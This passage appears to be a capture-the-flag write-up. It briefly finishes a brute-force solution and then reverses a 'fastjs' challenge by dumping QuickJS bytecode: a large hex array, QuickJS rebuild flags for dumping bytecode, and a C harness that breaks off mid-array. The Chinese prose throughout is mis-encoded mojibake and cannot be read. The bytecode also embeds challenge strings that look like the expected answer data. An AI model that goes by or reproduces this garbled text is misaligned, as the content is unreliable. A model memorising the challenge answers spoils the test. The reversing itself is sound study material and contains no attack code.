æ³•æ±‚å‡ºé¡ºåºã€‘ï¼Œè€Œè¿™è¾¹çš„æœ€ç»ˆè®¡ç®—ä¸é¡ºåºç›¸å…³ï¼Œä½†æ˜¯ã€ç”±äºå¯ä»¥åˆ†åˆ«è€ƒè™‘åå­—ï¼Œæ–œå¯¹è§’ï¼Œä¸­é—´æ–¹å—ã€‘ä¸‰ç§æƒ…å†µï¼Œæ­¤æ—¶çˆ†ç ´å˜æˆå¯èƒ½ã€‚ æœ€ç»ˆå¯ä»¥çˆ†ç ´å¾—åˆ°flag fastjsä¾ç…§è¿™ä¸ª https://bbs.pediy.com/thread-258985.htm é“¾æ¥å¯ä»¥çŸ¥é“ è·Ÿä¹‹å‰é•¿å®‰æ¯å’Œçœ‹é›ªKCTFé¢˜ç›®å·®ä¸å¤š å…ˆç”¨è„šæœ¬æ¢å¤ä¸€ä¸‹ç¬¦å· 0x02, 0x3A, 0x10, 0x6C, 0x6F, 0x6E, 0x67, 0x32, 0x73, 0x74, 0x72, 0x10, 0x73, 0x74, 0x72, 0x32, 0x6C, 0x6F, 0x6E, 0x67, 0x10, 0x73, 0x64, 0x66, 0x73, 0x66, 0x73, 0x64, 0x66, 0x0E, 0x73, 0x74, 0x72, 0x32, 0x48, 0x65, 0x78, 0x0E, 0x68, 0x65, 0x78, 0x32, 0x73, 0x74, 0x72, 0x0C, 0x78, 0x78, 0x78, 0x66, 0x73, 0x73, 0x08, 0x6D, 0x61, 0x69, 0x6E, 0x08, 0x61, 0x72, 0x67, 0x73, 0x82, 0x01, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x2B, 0x2F, 0x3D, 0x0E, 0x5F, 0x6B, 0x65, 0x79, 0x53, 0x74, 0x72, 0x0A, 0x64, 0x66, 0x73, 0x66, 0x73, 0x14, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x41, 0x72, 0x67, 0x73, 0x0A, 0x73, 0x68, 0x69, 0x66, 0x74, 0x0A, 0x65, 0x72, 0x72, 0x6F, 0x72, 0x20, 0x2E, 0x2F, 0x74, 0x65, 0x73, 0x74, 0x5F, 0x65, 0x6E, 0x63, 0x6F, 0x64, 0x65, 0x2E, 0x6A, 0x73, 0x02, 0x76, 0x02, 0x77, 0x04, 0x76, 0x6C, 0x04, 0x73, 0x6C, 0x02, 0x69, 0x18, 0x66, 0x72, 0x6F, 0x6D, 0x43, 0x68, 0x61, 0x72, 0x43, 0x6F, 0x64, 0x65, 0x12, 0x73, 0x75, 0x62, 0x73, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x02, 0x73, 0x06, 0x6C, 0x65, 0x6E, 0x14, 0x63, 0x68, 0x61, 0x72, 0x43, 0x6F, 0x64, 0x65, 0x41, 0x74, 0x06, 0x73, 0x74, 0x72, 0x06, 0x6B, 0x65, 0x79, 0x02, 0x6B, 0x02, 0x6E, 0x02, 0x7A, 0x02, 0x79, 0x0A, 0x64, 0x65, 0x6C, 0x74, 0x61, 0x04, 0x6D, 0x78, 0x02, 0x65, 0x02, 0x71, 0x06, 0x73, 0x75, 0x6D, 0x02, 0x70, 0x0A, 0x66, 0x6C, 0x6F, 0x6F, 0x72, 0x0C, 0x6F, 0x75, 0x74, 0x70, 0x75, 0x74, 0x08, 0x63, 0x68, 0x72, 0x31, 0x10, 0x70, 0x61, 0x72, 0x73, 0x65, 0x49, 0x6E, 0x74, 0x0C, 0x73, 0x75, 0x62, 0x73, 0x74, 0x72, 0x08, 0x63, 0x68, 0x72, 0x32, 0x08, 0x63, 0x68, 0x72, 0x33, 0x08, 0x65, 0x6E, 0x63, 0x31, 0x08, 0x65, 0x6E, 0x63, 0x32, 0x08, 0x65, 0x6E, 0x63, 0x33, 0x08, 0x65, 0x6E, 0x63, 0x34, 0x0A, 0x69, 0x73, 0x4E, 0x61, 0x4E, 0x0C, 0x63, 0x68, 0x61, 0x72, 0x41, 0x74, 0x12, 0x64, 0x66, 0x73, 0x66, 0x64, 0x73, 0x66, 0x73, 0x64, 0x0C, 0x66, 0x77,0x64, 0x65, 0x72, 0x66, 0x0A, 0x70, 0x72, 0x69, 0x6E, 0x74, 0x18, 0x79, 0x6F, 0x75, 0x72, 0x20, 0x69, 0x6E, 0x70, 0x75, 0x74, 0x3A, 0x20, 0x20, 0x6E, 0x6F, 0x5F, 0x74, 0x68, 0x69, 0x6E, 0x67, 0x5F, 0x69, 0x73, 0x5F, 0x74, 0x72, 0x75, 0x65, 0x0E, 0x64, 0x66, 0x64, 0x66, 0x77, 0x66, 0x33, 0xE0, 0x01, 0x30, 0x35, 0x61, 0x65, 0x64, 0x30, 0x63, 0x65, 0x34, 0x34, 0x31, 0x66, 0x38, 0x30, 0x62, 0x35, 0x62, 0x63, 0x33, 0x36, 0x61, 0x66, 0x34, 0x63, 0x36, 0x39, 0x38, 0x35, 0x30, 0x39, 0x66, 0x63, 0x36, 0x63, 0x63, 0x33, 0x63, 0x39, 0x37, 0x31, 0x34, 0x36, 0x33, 0x35, 0x33, 0x64, 0x65, 0x35, 0x61, 0x39, 0x35, 0x63, 0x36, 0x61, 0x62, 0x65, 0x61, 0x30, 0x37, 0x66, 0x64, 0x34, 0x61, 0x37, 0x30, 0x37, 0x30, 0x39, 0x33, 0x32, 0x64, 0x38, 0x36, 0x61, 0x63, 0x33, 0x32, 0x64, 0x36, 0x32, 0x38, 0x36, 0x37, 0x32, 0x61, 0x35, 0x39, 0x31, 0x32, 0x33, 0x65, 0x35, 0x39, 0x37, 0x32, 0x33, 0x33, 0x31, 0x64, 0x62, 0x35, 0x64, 0x66, 0x66, 0x65, 0x37, 0x30, 0x35, 0x37, 0x33, 0x36, 0x32, 0x06, 0x79, 0x65, 0x73, 0x0E, 0x00, 0x06, 0x00, 0xA0, 0x01, 0x00, 0x01, 0x00, 0x03, 0x00, 0x08, 0xE4, 0x01, 0x01, 0xA2, 0x01, 0x00, 0x00, 0x00, 0x3F, 0xE1, 0x00, 0x00, 0x00, 0x40, 0x3F, 0xE2, 0x00, 0x00, 0x00, 0x40, 0x3F, 0xE3, 0x00, 0x00, 0x00, 0x40, 0x3F, 0xE4, 0x00, 0x00, 0x00, 0x40, 0x3F, 0xE5, 0x00, 0x00, 0x00, 0x40, 0x3F, 0xE6, 0x00, 0x00, 0x00, 0x40, 0x3F, 0xE7, 0x00, 0x00, 0x00, 0x40, 0x3F, 0xE8, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x40, 0xE1, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x01, 0x40, 0xE2, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x02, 0x40, 0xE3, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x03, 0x40, 0xE4, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x04, 0x40, 0xE5, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x05, 0x40, 0xE6, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x07, 0x40, 0xE7, 0x00, 0x00, 0x00, 0x00, 0x3E, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x38, 0xE6, 0x00, 0x00, 0x00, 0x04, 0xE9, 0x00, 0x00, 0x00, 0x15, 0x43, 0xEA, 0x00, 0x00, 0x00, 0xC9, 0x38, 0xE6, 0x00, 0x00, 0x00, 0xC0, 0x06, 0x15, 0x43, 0xEB, 0x00, 0x00, 0x00, 0xC9, 0x06, 0xC9, 0x37, 0xEC, 0x00, 0x00, 0x00, 0xF4, 0xEB, 0x1D, 0x38, 0xEC, 0x00, 0x00, 0x00, 0x11, 0x39, 0xE8, 0x00, 0x00, 0x00, 0xC9, 0x38, 0xE8, 0x00, 0x00, 0x00, 0x42, 0xED, 0x00, 0x00, 0x00, 0x24, 0x00, 0x00, 0xC9, 0xEC, 0x25, 0x06, 0xC9, 0x37, 0x4D, 0x00, 0x00, 0x00, 0xF4, 0xEB, 0x0F, 0x38, 0x4D, 0x00, 0x00, 0x00, 0x11, 0x39, 0xE8, 0x00, 0x00, 0x00, 0xC9, 0xEC, 0x0D, 0x04, 0xEE, 0x00, 0x00, 0x00, 0x11, 0x39, 0xE8, 0x00, 0x00, 0x00, 0xC9, 0x38, 0xE7, 0x00, 0x00, 0x00, 0x38, 0xE8, 0x00, 0x00, 0x00, 0xEF, 0xCD, 0x28, 0xDE, 0x03, 0x01, 0x13, 0xF1, 0x00, 0x3E, 0xB0, 0x01, 0x58, 0x00, 0x05, 0x36, 0x00, 0x09, 0x40, 0x35, 0x3F, 0x49, 0x3F, 0x3F, 0x0D, 0x41, 0x0E, 0x43, 0x06, 0x00, 0xC2, 0x03, 0x02, 0x03, 0x02, 0x09, 0x00, 0x01, 0x6E, 0x05, 0xE0, 0x03, 0x00, 0x01, 0x00, 0xE2, 0x03, 0x00, 0x01, 0x00, 0xE4, 0x03, 0x00, 0x00, 0x00, 0xE6, 0x03, 0x00, 0x01, 0x00, 0xE8, 0x03, 0x00, 0x02, 0x00, 0xD1, 0xE9, 0xC9, 0xD1, 0xC5, 0xB6, 0x9E, 0x47, 0xBF, 0x00, 0xAD, 0xCA, 0xB5, 0xCB, 0xC7, 0xC5, 0xA3, 0xEA, 0x3B, 0xD1, 0xC7, 0x71, 0x38, 0x99, 0x00, 0x00, 0x00, 0x42, 0xF5, 0x00, 0x00, 0x00, 0xD1, 0xC7, 0x47, 0xBE, 0xFF, 0x00, 0xAD, 0xD1, 0xC7, 0x47, 0xBD, 0x08, 0xA2, 0xBE, 0xFF, 0x00, 0xAD, 0xD1, 0xC7, 0x47, 0xBD, 0x10, 0xA2, 0xBE, 0xFF, 0x00, 0xAD, 0xD1, 0xC7, 0x47, 0xBD, 0x18, 0xA2, 0xBE, 0xFF, 0x00, 0xAD, 0x24, 0x04, 0x00, 0x49, 0x93, 0x02, 0xEC, 0xC2, 0xD2, 0xEA, 0x15, 0xD1, 0x42, 0x5B, 0x00, 0x00, 0x00, 0xC1, 0x24, 0x01, 0x00, 0x42, 0xF6, 0x00, 0x00, 0x00, 0xB5, 0xC6, 0x25, 0x02, 0x00, 0xD1, 0x42, 0x5B, 0x00,0x00, 0x00, 0xC1, 0x25, 0x01, 0x00, 0xDE, 0x03, 0x01, 0x0B, 0x03, 0x12, 0x30, 0x27, 0x67, 0x35, 0x35, 0x49, 0x17, 0x12, 0x69, 0x06, 0x00, 0x00, 0xE0, 0xFF, 0xFF, 0xFF, 0xEF, 0x41, 0x0E, 0x43, 0x06, 0x00, 0xC4, 0x03, 0x02, 0x03, 0x02, 0x07, 0x00, 0x00, 0x5D, 0x05, 0xEE, 0x03, 0x00, 0x01, 0x00, 0xE2, 0x03, 0x00, 0x01, 0x00, 0xF0, 0x03, 0x00, 0x00, 0x00, 0xE0, 0x03, 0x00, 0x01, 0x00, 0xE8, 0x03, 0x00, 0x02, 0x00, 0xD1, 0xE9, 0xC9, 0x26, 0x00, 0x00, 0xCA, 0xB5, 0xCB, 0xC7, 0xC5, 0xA3, 0xEA, 0x46, 0xC6, 0xC7, 0xB7, 0xA1, 0x71, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC7, 0x24, 0x01, 0x00, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC7, 0xB6, 0x9D, 0x24, 0x01, 0x00, 0xBD, 0x08, 0xA0, 0xAF, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC7, 0xB7, 0x9D, 0x24, 0x01, 0x00, 0xBD, 0x10, 0xA0, 0xAF, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC7, 0xB8, 0x9D, 0x24, 0x01, 0x00, 0xBD, 0x18, 0xA0, 0xAF, 0x49, 0xB9, 0x94, 0x02, 0xEC, 0xB7, 0xD2, 0xEA, 0x06, 0xC6, 0xC6, 0xE9, 0xC5, 0x49, 0xC6, 0x28, 0xDE, 0x03, 0x13, 0x0B, 0x03, 0x12, 0x17, 0x27, 0x4E, 0x53, 0x53, 0x58, 0x1C, 0x12, 0x1D, 0x0E, 0x43, 0x06, 0x00, 0xC6, 0x03, 0x02, 0x0B, 0x02, 0x06, 0x00, 0x04, 0xF8, 0x01, 0x0D, 0xF4, 0x03, 0x00, 0x01, 0x00, 0xF6, 0x03, 0x00, 0x01, 0x00, 0xE0, 0x03, 0x00, 0x00, 0x00, 0xF8, 0x03, 0x00, 0x01, 0x00, 0xFA, 0x03, 0x00, 0x02, 0x00, 0xFC, 0x03, 0x00, 0x03, 0x00, 0xFE, 0x03, 0x00, 0x04, 0x00, 0x80, 0x04, 0x00, 0x05, 0x00, 0x82, 0x04, 0x00, 0x06, 0x00, 0x84, 0x04, 0x00, 0x07, 0x00, 0x86, 0x04, 0x00, 0x08, 0x00, 0x88, 0x04, 0x00, 0x09, 0x00, 0x8A, 0x04, 0x00, 0x0A, 0x00, 0xD1, 0xC1, 0xA9, 0xEA, 0x03, 0xC1, 0x28, 0x38, 0xE2, 0x00, 0x00, 0x00, 0xD1, 0x0A, 0xF0, 0xC9, 0x38, 0xE2, 0x00, 0x00, 0x00, 0xD2, 0x09, 0xF0, 0xCA, 0xC5, 0xE9, 0xB6, 0x9E, 0xCB, 0xC5, 0xC7, 0x47, 0xCC, 0xC5, 0xB5, 0x47, 0xC3, 0x04, 0xBF, 0x00, 0xC3, 0x05, 0x38, 0x9D, 0x00, 0x00, 0x00, 0x42, 0x06, 0x01, 0x00, 0x00, 0xBB, 0xBD, 0x34, 0xC7, 0xB6, 0x9D, 0x9B, 0x9D, 0x24, 0x01, 0x00, 0xC3, 0x08, 0xB5, 0xC3, 0x09, 0xC2, 0x08, 0x90, 0xC3, 0x08, 0xB5, 0xA5, 0x69, 0x9B, 0x00, 0x00, 0x00, 0xC2, 0x09, 0xC2, 0x05, 0x9D, 0xBF, 0x01, 0xAD, 0xC4, 0x09, 0xB7, 0xA2, 0xB8, 0xAD, 0xC3, 0x07, 0xB5, 0xC3, 0x0A, 0xC2, 0x0A, 0xC7, 0xA3, 0xEA, 0x43, 0xC5, 0xC2, 0x0A, 0xB6, 0x9D, 0x47, 0xC3, 0x04, 0xC8, 0xBA, 0xA2, 0xC2, 0x04, 0xB7, 0xA0, 0xAE, 0xC2, 0x04, 0xB8, 0xA2, 0xC8, 0xB9, 0xA0, 0xAE, 0x9D, 0xC2, 0x09, 0xC2, 0x04, 0xAE, 0xC6, 0xC2, 0x0A, 0xB8, 0xAD, 0xC2, 0x07, 0xAE, 0x47, 0xC8, 0xAE, 0x9D, 0xAE, 0xC3, 0x06, 0xC5, 0xC2, 0x0A, 0x71, 0xC5, 0xC2, 0x0A, 0x47, 0xC2, 0x06, 0x9D, 0xBF, 0x02, 0xAD, 0x16, 0x49, 0xCC, 0x93, 0x0A, 0xEC, 0xB9, 0xC5, 0xB5, 0x47, 0xC3, 0x04, 0xC8, 0xBA, 0xA2, 0xC2, 0x04, 0xB7, 0xA0, 0xAE, 0xC2, 0x04, 0xB8, 0xA2, 0xC8, 0xB9, 0xA0, 0xAE, 0x9D, 0xC2, 0x09, 0xC2, 0x04, 0xAE, 0xC6, 0xC2, 0x0A, 0xB8, 0xAD, 0xC2, 0x07, 0xAE, 0x47, 0xC8, 0xAE, 0x9D, 0xAE, 0xC3, 0x06, 0xC5, 0xC7, 0x71, 0xC5, 0xC7, 0x47, 0xC2, 0x06, 0x9D, 0xBF, 0x03, 0xAD, 0x16, 0x49, 0xCC, 0xED, 0x5F, 0xFF, 0x38, 0xE4, 0x00, 0x00, 0x00, 0x38, 0xE1, 0x00, 0x00, 0x00, 0xC5, 0x09, 0xF0, 0x23, 0x01, 0x00, 0xDE, 0x03, 0x23, 0x15, 0x03, 0x1C, 0x08, 0x08, 0x30, 0x30, 0x1D, 0x44, 0x85, 0x3F, 0x35, 0x21, 0x30, 0x2B, 0xBC, 0x58, 0x17, 0x1C, 0xBC, 0x4E, 0x13, 0x06, 0x00, 0x00, 0x20, 0x37, 0xEF, 0xC6, 0xE3, 0x41, 0x06, 0x00, 0x00, 0xE0, 0xFF, 0xFF, 0xFF, 0xEF, 0x41, 0x06, 0x00, 0x00, 0xE0, 0xFF, 0xFF, 0xFF, 0xEF, 0x41, 0x06, 0x00, 0x00, 0xE0, 0xFF, 0xFF, 0xFF, 0xEF, 0x41, 0x0E, 0x43, 0x06, 0x00, 0xC8, 0x03, 0x01, 0x03, 0x01, 0x04, 0x00, 0x01, 0x32, 0x04,0xB0, 0x01, 0x00, 0x01, 0x00, 0x8E, 0x04, 0x00, 0x00, 0x00, 0x90, 0x04, 0x00, 0x01, 0x00, 0xE8, 0x03, 0x00, 0x02, 0x00, 0xC1, 0xC9, 0xC1, 0xCA, 0xB5, 0xCB, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC7, 0x91, 0xCB, 0x24, 0x01, 0x00, 0x42, 0x37, 0x00, 0x00, 0x00, 0xBD, 0x10, 0x24, 0x01, 0x00, 0xCE, 0xE9, 0xB6, 0xA9, 0xEA, 0x06, 0xBF, 0x00, 0xC6, 0x9D, 0xCA, 0xC6, 0x94, 0x00, 0xC7, 0xD1, 0xE9, 0xA3, 0xEB, 0xD7, 0xC5, 0x28, 0xDE, 0x03, 0x3E, 0x08, 0x03, 0x0D, 0x0D, 0x0E, 0x76, 0x35, 0x12, 0x21, 0x07, 0x02, 0x30, 0x0E, 0x43, 0x06, 0x00, 0xCA, 0x03, 0x01, 0x03, 0x01, 0x06, 0x00, 0x00, 0x52, 0x04, 0xB0, 0x01, 0x00, 0x01, 0x00, 0x8E, 0x04, 0x00, 0x00, 0x00, 0xE8, 0x03, 0x00, 0x01, 0x00, 0xF8, 0x03, 0x00, 0x02, 0x00, 0xC1, 0xC9, 0xB5, 0xCA, 0xC6, 0xD1, 0xE9, 0xA3, 0xEA, 0x47, 0x38, 0x09, 0x01, 0x00, 0x00, 0xD1, 0x42, 0x0A, 0x01, 0x00, 0x00, 0xC6, 0xB6, 0x24, 0x02, 0x00, 0xBD, 0x10, 0xF0, 0xB9, 0xA0, 0x38, 0x09, 0x01, 0x00, 0x00, 0xD1, 0x42, 0x0A, 0x01, 0x00, 0x00, 0xC6, 0x8F, 0xCE, 0xB6, 0x24, 0x02, 0x00, 0xBD, 0x10, 0xF0, 0xAF, 0xCF, 0xBE, 0xFF, 0x00, 0xAD, 0xCB, 0xC5, 0x38, 0x99, 0x00, 0x00, 0x00, 0x42, 0xF5, 0x00, 0x00, 0x00, 0xC7, 0x24, 0x01, 0x00, 0x9D, 0xC9, 0x93, 0x01, 0xEC, 0xB5, 0xC5, 0x28, 0xDE, 0x03, 0x4A, 0x09, 0x03, 0x0D, 0x0D, 0x21, 0xDA, 0x21, 0x58, 0x0D, 0x0D, 0x0E, 0x43, 0x06, 0x00, 0xCC, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x29, 0xDE, 0x03, 0x56, 0x01, 0x03, 0x0E, 0x43, 0x06, 0x00, 0x00, 0x01, 0x09, 0x01, 0x04, 0x00, 0x00, 0xE6, 0x01, 0x0A, 0xB0, 0x01, 0x00, 0x01, 0x00, 0x8E, 0x04, 0x00, 0x00, 0x00, 0x90, 0x04, 0x00, 0x01, 0x00, 0x96, 0x04, 0x00, 0x02, 0x00, 0x98, 0x04, 0x00, 0x03, 0x00, 0x9A, 0x04, 0x00, 0x04, 0x00, 0x9C, 0x04, 0x00, 0x05, 0x00, 0x9E, 0x04, 0x00, 0x06, 0x00, 0xA0, 0x04, 0x00, 0x07, 0x00, 0xE8, 0x03, 0x00, 0x08, 0x00, 0xC1, 0xC9, 0xC1, 0xCC, 0xC1, 0xC3, 0x07, 0xB5, 0xC3, 0x08, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC2, 0x08, 0x91, 0xC3, 0x08, 0x24, 0x01, 0x00, 0xCA, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC2, 0x08, 0x91, 0xC3, 0x08, 0x24, 0x01, 0x00, 0xCB, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC2, 0x08, 0x91, 0xC3, 0x08, 0x24, 0x01, 0x00, 0xCC, 0xC6, 0xB7, 0xA1, 0xC3, 0x04, 0xC6, 0xB8, 0xAD, 0xB9, 0xA0, 0xC7, 0xB9, 0xA1, 0xAF, 0xC3, 0x05, 0xC7, 0xBD, 0x0F, 0xAD, 0xB7, 0xA0, 0xC8, 0xBB, 0xA1, 0xAF, 0xC3, 0x06, 0xC8, 0xBD, 0x3F, 0xAD, 0xC3, 0x07, 0x38, 0x11, 0x01, 0x00, 0x00, 0xC7, 0xEF, 0xEA, 0x09, 0xBD, 0x40, 0xC4, 0x07, 0xC3, 0x06, 0xEC, 0x0E, 0x38, 0x11, 0x01, 0x00, 0x00, 0xC8, 0xEF, 0xEA, 0x05, 0xBD, 0x40, 0xC3, 0x07, 0xC5, 0x38, 0xE6, 0x00, 0x00, 0x00, 0x41, 0xEA, 0x00, 0x00, 0x00, 0x42, 0x12, 0x01, 0x00, 0x00, 0xC2, 0x04, 0x24, 0x01, 0x00, 0x9D, 0x38, 0xE6, 0x00, 0x00, 0x00, 0x41, 0xEA, 0x00, 0x00, 0x00, 0x42, 0x12, 0x01, 0x00, 0x00, 0xC2, 0x05, 0x24, 0x01, 0x00, 0x9D, 0x38, 0xE6, 0x00, 0x00, 0x00, 0x41, 0xEA, 0x00, 0x00, 0x00, 0x42, 0x12, 0x01, 0x00, 0x00, 0xC2, 0x06, 0x24, 0x01, 0x00, 0x9D, 0x38, 0xE6, 0x00, 0x00, 0x00, 0x41, 0xEA, 0x00, 0x00, 0x00, 0x42, 0x12, 0x01, 0x00, 0x00, 0xC2, 0x07, 0x24, 0x01, 0x00, 0x9D, 0xC9, 0xC1, 0xD0, 0xCF, 0xCA, 0xC1, 0xC4, 0x07, 0xC4, 0x06, 0xC4, 0x05, 0xC3, 0x04, 0xC2, 0x08, 0xD1, 0xE9, 0xA3, 0x6A, 0x2A, 0xFF, 0xFF, 0xFF, 0xC5, 0x28, 0xDE, 0x03, 0x59, 0x18, 0x03, 0x0D, 0x0D, 0x12, 0x13, 0x4E, 0x4E, 0x4E, 0x1C, 0x3A, 0x3F, 0x21, 0x30, 0x21, 0x3A, 0x18, 0x08, 0x6C, 0x6C, 0x6C, 0x71, 0x17, 0x30, 0x35, 0x0E, 0x43, 0x06, 0x00, 0xCE, 0x03, 0x01, 0x04, 0x01, 0x04, 0x00, 0x00, 0x84, 0x01, 0x05, 0xD0, 0x03, 0x00, 0x01, 0x00, 0xB0, 0x01, 0x00, 0x00,0x00, 0xA6, 0x04, 0x00, 0x01, 0x00, 0xA8, 0x04, 0x00, 0x02, 0x00, 0xAC, 0x01, 0x00, 0x03, 0x00, 0xD1, 0xE9, 0xB6, 0xA3, 0xEA, 0x0D, 0x38, 0x15, 0x01, 0x00, 0x00, 0x04, 0xEE, 0x00, 0x00, 0x00, 0xEF, 0x29, 0x38, 0x15, 0x01, 0x00, 0x00, 0x04, 0x16, 0x01, 0x00, 0x00, 0xD1, 0xB5, 0x47, 0x9D, 0xEF, 0x0E, 0xD1, 0xB5, 0x47, 0xC9, 0x38, 0xE6, 0x00, 0x00, 0x00, 0x42, 0xEB, 0x00, 0x00, 0x00, 0xC5, 0x24, 0x01, 0x00, 0xCA, 0x04, 0x17, 0x01, 0x00, 0x00, 0x11, 0x39, 0x18, 0x01, 0x00, 0x00, 0x0E, 0x38, 0xE3, 0x00, 0x00, 0x00, 0xC6, 0x38, 0x18, 0x01, 0x00, 0x00, 0xF0, 0xCF, 0xE9, 0xBD, 0x70, 0xAA, 0xEA, 0x0D, 0x38, 0x15, 0x01, 0x00, 0x00, 0x04, 0xEE, 0x00, 0x00, 0x00, 0xEF, 0x29, 0x04, 0x19, 0x01, 0x00, 0x00, 0xCC, 0xC7, 0xC8, 0xA9, 0xEA, 0x0E, 0x38, 0x15, 0x01, 0x00, 0x00, 0x04, 0x1A, 0x01, 0x00, 0x00, 0xEF, 0x0E, 0x29, 0x38, 0x15, 0x01, 0x00, 0x00, 0x04, 0xEE, 0x00, 0x00, 0x00, 0xEF, 0x29, 0xDE, 0x03, 0x76, 0x11, 0x03, 0x21, 0x3B, 0x08, 0x54, 0x17, 0x4F, 0x3F, 0x40, 0x26, 0x3B, 0x09, 0x21, 0x1D, 0x3F, 0x09, 0x3C, 0x00, 0x00, 0x00, 0xDD, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 æ¢å¤ä¹‹åï¼Œæ ¹æ®é™„ä»¶å­—ç¬¦ä¸²çŸ¥é“æ˜¯2021.3.27ç‰ˆæœ¬ï¼Œgithubä¸Šæ‹‰å–ä¸€ä¸‹ï¼Œå¹¶ä¸”æ ¹æ®é“¾æ¥ä¿®æ”¹è„šæœ¬ //#define DUMP_BYTECODE (1) #define DUMP_BYTECODE (1) //#define DUMP_READ_OBJECT #define DUMP_READ_OBJECT #if DUMP_BYTECODE js_dump_function_bytecode(ctx, b); #endif makeè¿‡åæŠŠé‡Œé¢æ•°æ®dumpä¸‹æ¥ #include \"quickjs-libc.h\" #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; uint8_t qjsc_s[] = {0x02, 0x3A, 0x10, 0x6C, 0x6F, 0x6E, 0x67, 0x32, 0x73, 0x74, 0x72, 0x10, 0x73, 0x74, 0x72, 0x32, 0x6C, 0x6F, 0x6E, 0x67, 0x10, 0x73, 0x64, 0x66, 0x73, 0x66, 0x73, 0x64, 0x66, 0x0E, 0x73, 0x74, 0x72, 0x32, 0x48, 0x65, 0x78, 0x0E, 0x68, 0x65, 0x78, 0x32, 0x73, 0x74, 0x72, 0x0C, 0x78, 0x78, 0x78, 0x66, 0x73, 0x73, 0x08, 0x6D, 0x61, 0x69, 0x6E, 0x08, 0x61, 0x72, 0x67, 0x73, 0x82, 0x01, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x2B, 0x2F, 0x3D, 0x0E, 0x5F, 0x6B, 0x65, 0x79, 0x53, 0x74, 0x72, 0x0A, 0x64, 0x66, 0x73, 0x66, 0x73, 0x14, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x41, 0x72, 0x67, 0x73, 0x0A, 0x73, 0x68, 0x69, 0x66, 0x74, 0x0A, 0x65, 0x72, 0x72, 0x6F, 0x72, 0x20, 0x2E, 0x2F, 0x74, 0x65, 0x73, 0x74, 0x5F, 0x65, 0x6E, 0x63, 0x6F, 0x64, 0x65, 0x2E, 0x6A, 0x73, 0x02, 0x76, 0x02, 0x77, 0x04, 0x76, 0x6C, 0x04, 0x73, 0x6C, 0x02, 0x69, 0x18, 0x66, 0x72, 0x6F, 0x6D, 0x43, 0x68, 0x61, 0x72, 0x43, 0x6F, 0x64, 0x65, 0x12, 0x73,0x75, 0x62, 0x73, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x02, 0x73, 0x06, 0x6C, 0x65, 0x6E, 0x14, 0x63, 0x68, 0x61, 0x72, 0x43, 0x6F, 0x64, 0x65, 0x41, 0x74, 0x06, 0x73, 0x74, 0x72, 0x06, 0x6B, 0x65, 0x79, 0x02, 0x6B, 0x02, 0x6E, 0x02, 0x7A, 0x02, 0x79, 0x0A, 0x64, 0x65, 0x6C, 0x74, 0x61, 0x04, 0x6D, 0x78, 0x02, 0x65, 0x02, 0x71, 0x06, 0x73, 0x75, 0x6D, 0x02, 0x70, 0x0A, 0x66, 0x6C, 0x6F, 0x6F, 0x72, 0x0C, 0x6F, 0x75, 0x74, 0x70, 0x75, 0x74, 0x08, 0x63, 0x68, 0x72, 0x31, 0x10, 0x70, 0x61, 0x72, 0x73, 0x65, 0x49, 0x6E, 0x74, 0x0C, 0x73, 0x75, 0x62, 0x73, 0x74, 0x72, 0x08, 0x63, 0x68, 0x72, 0x32, 0x08, 0x63, 0x68, 0x72, 0x33, 0x08, 0x65, 0x6E, 0x63, 0x31, 0x08, 0x65, 0x6E, 0x63, 0x32, 0x08, 0x65, 0x6E, 0x63, 0x33, 0x08, 0x65, 0x6E, 0x63, 0x34, 0x0A, 0x69, 0x73, 0x4E, 0x61, 0x4E, 0x0C, 0x63, 0x68, 0x61, 0x72, 0x41, 0x74, 0x12, 0x64, 0x66, 0x73, 0x66, 0x64, 0x73, 0x66, 0x73, 0x64, 0x0C, 